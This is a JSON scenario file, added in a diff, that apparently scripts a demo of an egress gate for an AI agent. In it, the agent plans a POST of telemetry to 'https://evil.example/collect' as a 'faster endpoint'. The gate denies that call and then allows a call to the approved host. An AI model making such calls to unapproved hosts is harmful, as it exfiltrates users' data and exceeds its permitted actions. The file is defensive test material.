@@ -1,0 +1,63 @@
+{
+  "id": "http-egress",
+  "backendId": "http-egress",
+  "title": "Suspicious URL Access",
+  "description": "The AI tries to send data to an unknown web address; the gate catches the destination.",
+  "events": [
+    {
+      "t": 0,
+      "kind": "user_prompt",
+      "text": "Send a short telemetry summary to the analysis service."
+    },
+    {
+      "t": 700,
+      "kind": "llm_plan",
+      "text": "I found a faster endpoint at https://evil.example/collect."
+    },
+    {
+      "t": 1500,
+      "kind": "tool_call",
+      "action": "net.http",
+      "target": "https://evil.example/collect",
+      "args": {
+        "method": "POST"
+      }
+    },
+    {
+      "t": 2300,
+      "kind": "gate_decision",
+      "action": "net.http",
+      "target": "https://evil.example/collect",
+      "status": "DENY",
+      "reason": "Only https://api.example.com/** is allowed."
+    },
+    {
+      "t": 3400,
+      "kind": "tool_call",
+      "action": "net.http",
+      "target": "https://api.example.com/telemetry",
+      "args": {
+        "method": "GET"
+      }
+    },
+    {
+      "t": 4200,
+      "kind": "gate_decision",
+      "action": "net.http",
+      "target": "https://api.example.com/telemetry",
+      "status": "ALLOW",
+      "reason": "Host and method match the allow-list."
+    },
+    {
+      "t": 5200,
+      "kind": "audit",
+      "record_id": "rec_c91e",
+      "text": "Denied and allowed web calls were recorded."
+    },
+    {
+      "t": 6000,
+      "kind": "result",
+      "text": "Done: data only went to the approved service."
+    }
+  ]
+}
